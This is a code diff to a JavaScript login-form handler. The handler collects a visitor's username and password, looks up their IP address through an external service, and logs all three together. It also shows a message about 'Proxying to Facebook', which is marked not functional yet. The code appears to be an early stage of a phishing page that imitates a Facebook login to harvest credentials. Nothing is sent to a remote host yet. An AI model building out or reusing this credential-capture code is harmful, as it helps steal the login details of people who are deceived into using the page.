@@ -1,4 +1,3 @@
-// Function to get the user's IP address
 function getIpAddress() {
   return fetch('https://api.ipify.org?format=json')
     .then(response => response.json())
@@ -11,14 +10,25 @@ function getIpAddress() {
 
 // Form submission handler
 document.getElementById('loginForm').addEventListener('submit', function(event) {
-  event.preventDefault(); // Prevent the form from refreshing the page
-  const email = document.getElementById('email').value;
+  event.preventDefault();
+  const username = document.getElementById('username').value;
   const password = document.getElementById('password').value;
+  const statusMessage = document.getElementById('statusMessage');
 
-  // Get the IP address and log all details
+  // Show processing message
+  statusMessage.style.display = 'block';
+  statusMessage.textContent = 'Processing your login...';
+
+  // Get IP and log details
   getIpAddress().then(ip => {
-    const loginDetails = { email, password, ip };
+    const loginDetails = { username, password, ip };
     console.log('Login attempt:', loginDetails);
-    alert('Proxying to Facebook... (not functional yet) IP: ' + ip);
+    // Simulate proxying (placeholder)
+    setTimeout(() => {
+      statusMessage.textContent = 'Proxying to Facebook... (not functional yet) IP: ' + ip;
+      setTimeout(() => {
+        statusMessage.style.display = 'none'; // Hide after delay
+      }, 2000);
+    }, 1000);
   });
 });
